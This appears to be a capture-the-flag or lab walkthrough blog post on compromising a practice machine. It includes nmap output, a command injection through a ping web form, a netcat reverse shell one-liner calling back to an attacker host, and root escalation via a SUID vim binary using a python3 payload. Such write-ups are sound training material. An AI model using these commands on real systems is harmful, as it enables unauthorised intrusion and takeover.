
sepi0l | January 1 | 2024

## Enumeration:  

### Nmap
```bash
mkdir nmap
nmap 192.168.175.86  -sC -sV -T3 -vvv -oN nmap/initial 
nmap 192.168.175.86  -p- -oN nmap/all_ports 
```

#### Output:

```bash
# Nmap 7.94 scan initiated Tue Jan  2 14:05:55 2024 as: nmap -sC -sV -T3 -vvv -oN nmap/initial 192.168.175.86
Nmap scan report for 192.168.175.86
Host is up, received syn-ack (0.21s latency).
Scanned at 2024-01-02 14:05:58 IST for 185s
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKxggEEcOcfAnY39JxZPtqfSeoP5ELSTfKdMZW1gwC5cdbN+n+rNZtzEFPJtRQrUGYntWi9OI642XAYf/w7EYnahMudH6sEkBBnycJB9mpMznx6j2woFqEC99hV2Kv+HrKBfUVH2ZottNDMTAeHmAQn38urRKTSw5XRL2lIHyjAlQuhBC9G0IOHSQevab1JO7QMS7RinkKMuK471IKEiGo6cs2qYl7s5/mbPzn74ItxZyjMaNreraKLzxxUv2rXO4D1KLJGH8hoHCdoueHenF0jA4mggOLtx33gi/Dwj65GZqz3up/93Rk3KFx9PDH81Wl/RMXzJPHObWTXFUgYCPR
|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmK6n2750Zgk5TzwOOVaORuM6X+mZvgnDZ089sXvhfp5r09499qYQzThIXcaOuWpDmzP2e/eK27h5teQUyF+Bw=
|   256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINPPEuspoT6EYlb7TZCsDgkEBtBHIlzl8yu089UQJsA8
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site does not have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  2 14:09:03 2024 -- 1 IP address (1 host up) scanned in 188.28 seconds

```


### Website : 

Port 80 has a website which offers a basic functionality to ping hosts. 
Could be susceptible to command injection.

![[Pasted image 20240102141320.png]]

A basic command injection payload such as `; id` confirms our guess. It displays the output of the id command.

![[Pasted image 20240102141507.png]]

## Gaining Access:

Let's try Getting a reverse shell with this oneliner  :  
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f
```

Reverse shell received, we are in.
![[Pasted image 20240102142240.png]]

let's spawn a tty :
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```


## Privilege Escalation:

Let's start with finding SUID binaries which we can exploit to escalate our privileges .

```bash
find / -type f -perm -4000 2>/dev/null
```

#### Output:

![[Pasted image 20240102142834.png]]

We have a SUID binaries which stands out. `/usr/bin/vim.basic`.

Let's look at  **GTFOBINS** [https://gtfobins.github.io/gtfobins] to discover possible ways of abusing this binary.

#### Root via Vim :

![[Pasted image 20240102143205.png]]

Looks like , we can use the above command to spawn a `/bin/sh` shell as the root user. Let's try if it works:

It throws an error. That's because the machine doesn't have python, but our payload uses python. Let's modify the payload and change `:py` to :`py3` to use python3.  This is the modified payload.

```bash
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

And that works. We now have our Effective User ID(EUID) set to 0 which is the EUID of root. 

![[Pasted image 20240102143831.png]]

We have pwned the machine!.


]